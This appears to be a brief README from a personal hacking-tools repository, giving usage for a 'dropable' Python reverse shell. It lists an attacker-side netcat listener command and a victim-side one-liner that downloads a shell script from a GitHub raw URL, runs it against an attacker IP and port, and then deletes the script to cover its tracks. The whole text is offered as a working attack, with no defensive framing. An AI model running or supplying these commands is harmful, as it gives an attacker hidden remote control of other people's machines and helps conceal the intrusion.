# Common Hacking Stuff I need to have in cloud

## Dropable Python Reverse shell

### Usage:

#### Attacker

`nc -lvp <port>`

#### Victim

`wget https://raw.githubusercontent.com/ElChicoDePython/HackingStuff/master/python_shell.py && python python_shell.py <attacker_ip> <attacker_port>; rm python_shell.py`
